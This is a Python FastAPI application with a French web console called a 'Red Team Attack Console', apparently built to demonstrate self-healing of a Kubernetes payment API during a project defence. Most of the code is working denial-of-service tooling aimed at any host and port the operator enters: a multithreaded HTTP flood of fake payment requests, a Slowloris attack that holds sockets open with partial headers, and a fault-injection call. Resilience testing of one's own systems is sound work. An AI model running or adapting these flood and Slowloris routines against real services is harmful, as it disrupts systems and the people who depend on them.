import os
import sys
import time
import socket
import random
import threading
import httpx
from typing import Optional
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

app = FastAPI(title="Red Team Attack Console")

# État partagé de l'attaque en cours
attack_state = {
    "is_attacking": False,
    "attack_type": None,
    "target_host": "localhost",
    "target_port": 80,
    "requests_sent": 0,
    "requests_success": 0,
    "requests_failed": 0,
    "start_time": None,
    "duration_sec": 0,
    "log_messages": [],
}

def log(msg: str):
    now_str = time.strftime("%H:%M:%S")
    entry = f"[{now_str}] {msg}"
    attack_state["log_messages"].insert(0, entry)
    if len(attack_state["log_messages"]) > 80:
        attack_state["log_messages"].pop()

class AttackConfig(BaseModel):
    target_host: str = "localhost"
    target_port: int = 80
    mode: str = "demo" # demo, flood, slowloris, chaos
    duration_sec: int = 25
    concurrency: int = 15
    chaos_latency_ms: int = 1500
    chaos_error_rate: float = 0.65

def run_http_flood(host: str, port: int, duration_sec: int, concurrency: int):
    base_url = f"http://{host}:{port}"
    attack_state["is_attacking"] = True
    attack_state["attack_type"] = "HTTP Flood"
    attack_state["start_time"] = time.time()
    attack_state["duration_sec"] = duration_sec

    log(f"Lancement HTTP Flood volumétrique vers {base_url} ({concurrency} threads, {duration_sec}s)...")
    end_time = time.time() + duration_sec

    def worker():
        client = httpx.Client(timeout=3.0)
        while attack_state["is_attacking"] and time.time() < end_time:
            try:
                payload = {
                    "amount": round(random.uniform(5.0, 80.0), 2),
                    "currency": "EUR",
                    "customer_name": f"BOT-{random.randint(100, 999)}",
                    "customer_email": "botnet@adversary.xyz",
                    "card_number": "4532000000009999",
                    "card_expiry": "12/28",
                    "card_cvv": "000",
                    "merchant_id": "TARGET-MERCHANT",
                }
                res = client.post(f"{base_url}/api/v1/payments", json=payload)
                attack_state["requests_sent"] += 1
                if res.status_code == 201:
                    attack_state["requests_success"] += 1
                else:
                    attack_state["requests_failed"] += 1
            except Exception:
                attack_state["requests_sent"] += 1
                attack_state["requests_failed"] += 1

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(concurrency)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=duration_sec + 2)

    attack_state["is_attacking"] = False
    log(f"Fin du HTTP Flood. Total envoyé: {attack_state['requests_sent']} requêtes.")

def run_slowloris(host: str, port: int, duration_sec: int, sockets_count: int = 60):
    attack_state["is_attacking"] = True
    attack_state["attack_type"] = "Slowloris"
    attack_state["start_time"] = time.time()
    attack_state["duration_sec"] = duration_sec

    log(f"Lancement Slowloris vers {host}:{port} ({sockets_count} sockets)...")
    headers = [
        f"GET /api/v1/payments HTTP/1.1\r\n",
        f"Host: {host}\r\n",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) RedTeamConsole/2.0\r\n",
        "Accept-language: en-US,en,q=0.5\r\n",
    ]
    sockets_list = []
    for _ in range(sockets_count):
        if not attack_state["is_attacking"]:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            for h in headers:
                s.send(h.encode("utf-8"))
            sockets_list.append(s)
            attack_state["requests_sent"] += 1
        except Exception:
            attack_state["requests_failed"] += 1

    log(f"{len(sockets_list)} connexions ouvertes. Émission de keep-alive incomplets...")
    end_time = time.time() + duration_sec
    while attack_state["is_attacking"] and time.time() < end_time:
        for s in list(sockets_list):
            try:
                s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode("utf-8"))
            except Exception:
                sockets_list.remove(s)
                attack_state["requests_failed"] += 1
        time.sleep(4)

    for s in sockets_list:
        try:
            s.close()
        except Exception:
            pass

    attack_state["is_attacking"] = False
    log("Fin de l'attaque Slowloris.")

def run_chaos(host: str, port: int, latency_ms: int, error_rate: float):
    base_url = f"http://{host}:{port}"
    log(f"Injection Chaos vers {base_url} (Latence: {latency_ms}ms, Erreurs: {int(error_rate*100)}%)...")
    try:
        res = httpx.post(
            f"{base_url}/api/v1/chaos/configure",
            json={"injected_latency_ms": latency_ms, "injected_error_rate": error_rate},
            timeout=5.0,
        )
        if res.status_code == 200:
            log("[SUCCÈS] Perturbation injectée dans l'API de paiement.")
        else:
            log(f"[ERREUR] Échec de l'injection (HTTP {res.status_code})")
    except Exception as e:
        log(f"[EXCEPTION] Cible injoignable : {e}")

def run_demo_scenario(host: str, port: int, duration_sec: int, latency_ms: int, error_rate: float, concurrency: int):
    log("=== DÉBUT DU SCÉNARIO DÉMO JURY ===")
    run_chaos(host, port, latency_ms, error_rate)
    time.sleep(1)
    run_http_flood(host, port, duration_sec=duration_sec, concurrency=concurrency)
    log("=== SCÉNARIO TERMINÉ : Observez la reprise Zero-Touch sur le SOC ===")

@app.get("/api/status")
def get_status():
    elapsed = 0
    if attack_state["start_time"] and attack_state["is_attacking"]:
        elapsed = round(time.time() - attack_state["start_time"], 1)
    return {
        **attack_state,
        "elapsed_sec": elapsed,
    }

@app.post("/api/target/ping")
def ping_target(cfg: AttackConfig):
    try:
        start = time.time()
        res = httpx.get(f"http://{cfg.target_host}:{cfg.target_port}/health", timeout=2.5)
        latency = round((time.time() - start) * 1000, 1)
        if res.status_code == 200:
            return {"reachable": True, "latency_ms": latency, "status": "ONLINE"}
        else:
            return {"reachable": True, "latency_ms": latency, "status": f"HTTP {res.status_code}"}
    except Exception as e:
        return {"reachable": False, "error": str(e)}

@app.post("/api/attack/start")
def start_attack(cfg: AttackConfig, background_tasks: BackgroundTasks):
    if attack_state["is_attacking"]:
        return {"error": "Une attaque est déjà en cours d'exécution."}

    attack_state["target_host"] = cfg.target_host
    attack_state["target_port"] = cfg.target_port
    attack_state["requests_sent"] = 0
    attack_state["requests_success"] = 0
    attack_state["requests_failed"] = 0

    if cfg.mode == "demo":
        background_tasks.add_task(
            run_demo_scenario,
            cfg.target_host,
            cfg.target_port,
            cfg.duration_sec,
            cfg.chaos_latency_ms,
            cfg.chaos_error_rate,
            cfg.concurrency,
        )
    elif cfg.mode == "flood":
        background_tasks.add_task(run_http_flood, cfg.target_host, cfg.target_port, cfg.duration_sec, cfg.concurrency)
    elif cfg.mode == "slowloris":
        background_tasks.add_task(run_slowloris, cfg.target_host, cfg.target_port, cfg.duration_sec)
    elif cfg.mode == "chaos":
        background_tasks.add_task(run_chaos, cfg.target_host, cfg.target_port, cfg.chaos_latency_ms, cfg.chaos_error_rate)

    return {"message": f"Attaque [{cfg.mode.upper()}] lancée avec succès."}

@app.post("/api/attack/stop")
def stop_attack():
    attack_state["is_attacking"] = False
    log("Arrêt forcé de l'attaque par l'opérateur.")
    return {"message": "Attaque interrompue."}

@app.get("/", response_class=HTMLResponse)
def index_page():
    return HTML_CONTENT

HTML_CONTENT = """<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>PROJECT RESILIENCE — Red Team Control Console</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23EF4444'><path d='M12 2L1 21h22L12 2zm0 3.5L20.5 19h-17L12 5.5zM11 10v4h2v-4h-2zm0 6v2h2v-2h-2z'/></svg>">
</head>
<body class="bg-[#08080C] text-gray-200 min-h-screen font-sans selection:bg-rose-500 selection:text-white">
  <!-- Top bar -->
  <header class="border-b border-rose-950/80 bg-[#0F0B10]/90 backdrop-blur-md sticky top-0 z-50 px-6 py-4">
    <div class="max-w-6xl mx-auto flex justify-between items-center">
      <div class="flex items-center gap-3">
        <div class="p-2.5 bg-rose-600/20 border border-rose-500/50 text-rose-400 rounded-xl shadow-lg shadow-rose-950">
          <svg class="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
          </svg>
        </div>
        <div>
          <span class="font-extrabold tracking-widest text-lg text-white flex items-center gap-2">
            RED TEAM ADVERSARY CONSOLE
            <span class="text-[10px] font-bold px-2 py-0.5 rounded-full bg-rose-950 text-rose-300 border border-rose-700/60 uppercase">
              External Node
            </span>
          </span>
          <p class="text-xs text-rose-400/80">Console d'évaluation de la cyber-résilience — Machine Attaquante</p>
        </div>
      </div>
      <div id="targetPill" class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-slate-900 border border-slate-800 text-xs font-mono">
        <span class="w-2 h-2 rounded-full bg-slate-500"></span>
        <span class="text-slate-400">Non testé</span>
      </div>
    </div>
  </header>

  <main class="max-w-6xl mx-auto p-6 space-y-6">
    <!-- Configuration de la cible -->
    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 bg-[#120E15] border border-rose-950/60 rounded-2xl p-5 shadow-xl">
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-rose-400 mb-1.5">Adresse IP Cible (Cluster K8s)</label>
        <input type="text" id="targetHost" value="192.168.1.50" placeholder="ex: 192.168.1.50 ou localhost"
               class="w-full bg-[#09070B] border border-rose-900/60 rounded-xl px-3.5 py-2 text-sm text-white font-mono focus:outline-none focus:border-rose-500">
      </div>
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-rose-400 mb-1.5">Port HTTP (Ingress ou API)</label>
        <input type="number" id="targetPort" value="80" placeholder="80 (Ingress) ou 8000"
               class="w-full bg-[#09070B] border border-rose-900/60 rounded-xl px-3.5 py-2 text-sm text-white font-mono focus:outline-none focus:border-rose-500">
      </div>
      <div class="flex items-end">
        <button onclick="pingTarget()" class="w-full py-2 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-sm font-semibold transition flex items-center justify-center gap-2">
          <span>Tester la connectivité (Ping)</span>
        </button>
      </div>
    </div>

    <!-- Choix du Scénario d'Attaque -->
    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
      <!-- Scénario Démo -->
      <div class="md:col-span-2 bg-gradient-to-br from-rose-950/40 via-[#140E18] to-[#120E15] border-2 border-rose-600/70 rounded-2xl p-6 shadow-2xl relative overflow-hidden flex flex-col justify-between">
        <div class="space-y-2">
          <div class="flex items-center justify-between">
            <span class="text-xs font-black tracking-widest text-rose-400 uppercase bg-rose-950/80 px-2 py-0.5 rounded border border-rose-600">Recommandé Jury</span>
            <span class="text-xs font-mono text-slate-400">Scénario #1</span>
          </div>
          <h3 class="text-xl font-black text-white">🎬 Démo Complète Soutenance</h3>
          <p class="text-xs text-slate-300 leading-relaxed">
            Enchaîne l'injection de chaos (1500ms de latence + 65% d'erreurs 500) combinée à un assaut HTTP Flood. Déclenche immédiatement l'Isolation Forest de l'AIOps et la remédiation K8s.
          </p>
        </div>
        <button onclick="launchAttack('demo')" class="mt-6 w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white font-bold text-sm tracking-wide shadow-lg shadow-rose-900/50 transition">
          🚀 Déclencher l'Attaque Démo (25s)
        </button>
      </div>

      <!-- HTTP Flood -->
      <div class="bg-[#120E15] border border-rose-950/60 rounded-2xl p-5 shadow-xl flex flex-col justify-between">
        <div class="space-y-2">
          <span class="text-[10px] font-bold text-rose-400 uppercase">Volumétrique</span>
          <h3 class="text-base font-bold text-white">🌊 HTTP Flood</h3>
          <p class="text-xs text-slate-400">Sature l'API de paiement avec un flot massif de transactions simultanées.</p>
        </div>
        <button onclick="launchAttack('flood')" class="mt-4 w-full py-2.5 px-3 rounded-xl bg-rose-950/60 hover:bg-rose-900/60 border border-rose-700/60 text-rose-200 text-xs font-bold transition">
          Lancer HTTP Flood
        </button>
      </div>

      <!-- Slowloris -->
      <div class="bg-[#120E15] border border-rose-950/60 rounded-2xl p-5 shadow-xl flex flex-col justify-between">
        <div class="space-y-2">
          <span class="text-[10px] font-bold text-rose-400 uppercase">Low-and-Slow</span>
          <h3 class="text-base font-bold text-white">🐌 Slowloris</h3>
          <p class="text-xs text-slate-400">Épuise la table de connexions du serveur sans surcharger le CPU.</p>
        </div>
        <button onclick="launchAttack('slowloris')" class="mt-4 w-full py-2.5 px-3 rounded-xl bg-rose-950/60 hover:bg-rose-900/60 border border-rose-700/60 text-rose-200 text-xs font-bold transition">
          Lancer Slowloris
        </button>
      </div>
    </div>

    <!-- Statut en direct & Télémétrie -->
    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
      <div class="bg-[#120E15] border border-rose-950/60 rounded-xl p-4">
        <span class="text-[11px] text-slate-400 block mb-1">État de l'Attaque</span>
        <span id="attackStatusText" class="text-lg font-bold font-mono text-slate-300">IDLE (En attente)</span>
      </div>
      <div class="bg-[#120E15] border border-rose-950/60 rounded-xl p-4">
        <span class="text-[11px] text-slate-400 block mb-1">Requêtes Envoyées</span>
        <span id="statSent" class="text-lg font-bold font-mono text-rose-400">0</span>
      </div>
      <div class="bg-[#120E15] border border-rose-950/60 rounded-xl p-4">
        <span class="text-[11px] text-slate-400 block mb-1">Succès / Passées</span>
        <span id="statSuccess" class="text-lg font-bold font-mono text-emerald-400">0</span>
      </div>
      <div class="bg-[#120E15] border border-rose-950/60 rounded-xl p-4">
        <span class="text-[11px] text-slate-400 block mb-1">Échecs / Bloquées</span>
        <span id="statFailed" class="text-lg font-bold font-mono text-red-500">0</span>
      </div>
    </div>

    <!-- Terminal de Logs Red Team -->
    <div class="bg-[#120E15] border border-rose-950/60 rounded-2xl p-5 shadow-xl space-y-3">
      <div class="flex justify-between items-center">
        <div class="flex items-center gap-2">
          <span class="w-3 h-3 rounded-full bg-rose-500 animate-pulse"></span>
          <h4 class="text-xs font-bold uppercase tracking-wider text-white">Journal d'Émission Tactique (Red Team Logs)</h4>
        </div>
        <button onclick="stopAttack()" class="px-3 py-1 rounded-lg bg-red-950 hover:bg-red-900 border border-red-700 text-red-300 text-xs font-semibold">
          Arrêt d'Urgence
        </button>
      </div>
      <div id="logsBox" class="bg-[#070509] rounded-xl border border-rose-950 p-4 font-mono text-xs max-h-56 overflow-y-auto space-y-1 text-slate-300">
        <div class="text-slate-500">Prêt. Configurez l'adresse IP de la cible et lancez l'attaque pour observer la résilience.</div>
      </div>
    </div>
  </main>

  <script>
    async function pingTarget() {
      const host = document.getElementById('targetHost').value.trim();
      const port = parseInt(document.getElementById('targetPort').value);
      const pill = document.getElementById('targetPill');
      pill.innerHTML = `<span class="w-2 h-2 rounded-full bg-amber-400 animate-ping"></span><span class="text-amber-300 font-mono">Test...</span>`;

      try {
        const res = await fetch('/api/target/ping', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({target_host: host, target_port: port})
        });
        const data = await res.json();
        if (data.reachable) {
          pill.className = "flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/80 border border-emerald-500/50 text-xs font-mono text-emerald-300";
          pill.innerHTML = `<span class="w-2 h-2 rounded-full bg-emerald-400"></span>Cible EN LIGNE (${data.latency_ms}ms)`;
        } else {
          pill.className = "flex items-center gap-2 px-3 py-1.5 rounded-full bg-rose-950/80 border border-rose-500/50 text-xs font-mono text-rose-300";
          pill.innerHTML = `<span class="w-2 h-2 rounded-full bg-rose-500 animate-ping"></span>Injoignable`;
        }
      } catch (e) {
        pill.innerHTML = `Erreur réseau`;
      }
    }

    async function launchAttack(mode) {
      const host = document.getElementById('targetHost').value.trim();
      const port = parseInt(document.getElementById('targetPort').value);
      try {
        await fetch('/api/attack/start', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            target_host: host,
            target_port: port,
            mode: mode,
            duration_sec: 25,
            concurrency: 15,
            chaos_latency_ms: 1500,
            chaos_error_rate: 0.65
          })
        });
      } catch (err) {
        alert("Erreur de commande : " + err);
      }
    }

    async function stopAttack() {
      await fetch('/api/attack/stop', {method: 'POST'});
    }

    async function pollStatus() {
      try {
        const res = await fetch('/api/status');
        const data = await res.json();

        const statusEl = document.getElementById('attackStatusText');
        if (data.is_attacking) {
          statusEl.innerText = `EN COURS : ${data.attack_type} (${data.elapsed_sec}s)`;
          statusEl.className = "text-lg font-bold font-mono text-rose-400 animate-pulse";
        } else {
          statusEl.innerText = "IDLE (En attente)";
          statusEl.className = "text-lg font-bold font-mono text-slate-400";
        }

        document.getElementById('statSent').innerText = data.requests_sent;
        document.getElementById('statSuccess').innerText = data.requests_success;
        document.getElementById('statFailed').innerText = data.requests_failed;

        const box = document.getElementById('logsBox');
        if (data.log_messages && data.log_messages.length > 0) {
          box.innerHTML = data.log_messages.map(m => `<div>${m}</div>`).join('');
        }
      } catch (e) {}
    }

    setInterval(pollStatus, 1000);
  </script>
</body>
</html>"""

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=5000, reload=True)
